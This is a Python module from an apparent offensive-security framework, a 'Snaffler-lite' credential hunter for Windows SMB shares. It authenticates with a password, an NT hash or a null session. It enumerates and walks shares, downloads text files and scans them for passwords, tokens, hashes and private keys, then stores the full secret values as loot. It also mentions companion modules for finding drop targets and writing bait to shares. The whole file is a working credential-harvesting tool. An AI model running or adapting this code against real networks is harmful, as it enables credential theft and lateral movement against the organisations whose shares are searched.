"""Credential hunting over SMB shares (Snaffler-lite).

share_spider finds files worth looking at; this module reads them. The
funnel is deliberate — content reads cost a round trip each, so the
module tiers by FILENAME first (credpatterns.tier_filename), only
downloads allow-listed text files under MAXSIZE, and caps total reads
at MAXDOWNLOADS. Content goes through the credpatterns corpus:
passwords, connection strings, command-line creds, web configs, tokens,
hashes, private keys — with the placeholder filter so `changeme` and
`${vault.ref}` don't bury the real hits.

Findings are severity-tiered loot (CRITICAL proof containers down to
NAME mentions), values included.
Read-only — it never writes to the share (that's hash_bait's job).
"""

from core import credpatterns
from core.module import AuxiliaryModule
from core.options import OptAddress, OptInt, OptPort, OptString

try:
    from impacket.dcerpc.v5 import srvs, transport
    from impacket.smbconnection import SMBConnection
except ImportError:
    srvs = transport = SMBConnection = None  # console gates run()

SKIP_SHARES = {"IPC$", "print$", "NETLOGON"}
# SYSVOL is walked (GPP lives there) but only the Policies tree
SKIP_DIRS = {"amd64", "x64", "w32x86", "win32", "ia64"}


class CredHunt(AuxiliaryModule):
    name = "Credential Hunt (SMB share content scan)"
    description = """
        Walks SMB shares hunting credentials in file CONTENTS: tiers
        filenames first (CRITICAL containers, INTEREST, NAME mentions),
        downloads allow-listed text <= MAXSIZE (capped at MAXDOWNLOADS
        reads), and scans with the credpatterns corpus + placeholder
        filter. Findings tier into loot (values included — that's the
        point). Read-only. Pair with share_spider's WRITE_CHECK to find
        the same shares' drop targets.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=445, description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local account)"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username (blank = null session)"))
        self.options.add(OptString("PASSWORD", default="", description="Password"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex (overrides PASSWORD)"))
        self.options.add(OptString("SHARES", default="",
                                   description="Shares, comma-separated "
                                               "(blank = enumerate)"))
        self.options.add(OptInt("MAXDEPTH", default=3,
                                description="Directory recursion depth"))
        self.options.add(OptInt("MAXSIZE", default=262144,
                                description="Max file size to content-scan (bytes)"))
        self.options.add(OptInt("MAXDOWNLOADS", default=200,
                                description="Max files to content-scan per host"))
        self.options.add(OptString("MINSEVERITY", default="INTEREST",
                                   description="Minimum finding severity "
                                               "(CRITICAL,HIGH,KEY,INTEREST,NAME)"))

    def run(self):
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._hunt(host)

    def _login(self, host):
        conn = SMBConnection(host, host, sess_port=int(self.get_option("RPORT")),
                             timeout=30)
        user = str(self.get_option("USERNAME") or "")
        domain = str(self.get_option("DOMAIN") or ".")
        nthash = str(self.get_option("NTHASH") or "").strip()
        if nthash:
            conn.login(user, "", domain, "", nthash)
        else:
            conn.login(user, str(self.get_option("PASSWORD") or ""), domain)
        return conn

    def _shares(self, conn, host):
        try:
            rpc = transport.DCERPCTransportFactory(
                f"ncacn_np:{conn.getRemoteHost()}[\\pipe\\srvsvc]")
            rpc.set_smb_connection(conn)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrShareEnum(dce, 1)
            return [entry["shi1_netname"].rstrip("\x00")
                    for entry in resp["InfoStruct"]["ShareInfo"]["Level1"]["Buffer"]]
        except Exception as e:
            self.print_error(f"{host}: share enum failed - {e}")
            return []

    def _hunt(self, host):
        try:
            conn = self._login(host)
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        shares = [s.strip() for s in str(self.get_option("SHARES") or "").split(",")
                  if s.strip()] or self._shares(conn, host)
        state = {"downloads": 0, "scanned": 0}
        findings = []
        for share in shares:
            if share in SKIP_SHARES:
                continue
            findings.extend(self._walk(conn, host, share, "", 0, state))
        conn.close()

        findings.sort(key=lambda f: -credpatterns.SEVERITY_RANK[f[0]])
        for severity, label, where, excerpt in findings:
            self.print_good(f"{host}: [{severity}] {label}: {where}")
            if excerpt:
                self.print_line(f"      {excerpt}")
        if not findings:
            self.print_status(f"{host}: nothing credential-shaped found")
        self.print_status(f"{host}: {state['scanned']} file(s) content-scanned")

        store = getattr(self.framework, "store", None)
        if store is not None and findings:
            lines = [f"[{sev}] {label}: {where}" +
                     (f"\n    {ex}" if ex else "")
                     for sev, label, where, ex in findings]
            store.add_loot("cred-hunt", f"credentials @ {host}",
                           "\n".join(lines), address=host)

    def _walk(self, conn, host, share, path, level, state):
        if level > int(self.get_option("MAXDEPTH")) or \
                state["downloads"] >= int(self.get_option("MAXDOWNLOADS")):
            return
        try:
            entries = conn.listPath(share, f"{path}\\*" if path else "\\*")
        except Exception as e:
            self.print_debug(f"{host}: {share}:{path or '/'}: {e}")
            return
        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            full = f"{path}\\{name}" if path else name
            if entry.is_directory():
                if name.lower() not in SKIP_DIRS:
                    yield from self._walk(conn, host, share, full,
                                          level + 1, state)
                continue
            where = f"{share}\\{full}"
            tier = credpatterns.tier_filename(name)
            if tier:
                yield (tier[0], tier[1], where, "")
            if state["downloads"] >= int(self.get_option("MAXDOWNLOADS")):
                continue
            size = entry.get_filesize()
            if size == 0 or size > int(self.get_option("MAXSIZE")):
                continue
            if not credpatterns.is_text_candidate(name):
                continue
            state["downloads"] += 1
            try:
                buf = []
                conn.getFile(share, full, buf.append)
                data = b"".join(buf)
            except Exception as e:
                self.print_debug(f"{host}: {where}: {e}")
                continue
            state["scanned"] += 1
            text = credpatterns.decode_maybe_utf16(data)
            for severity, label, excerpt in credpatterns.scan_text(
                    name, text, str(self.get_option("MINSEVERITY"))):
                yield (severity, label, where, excerpt)
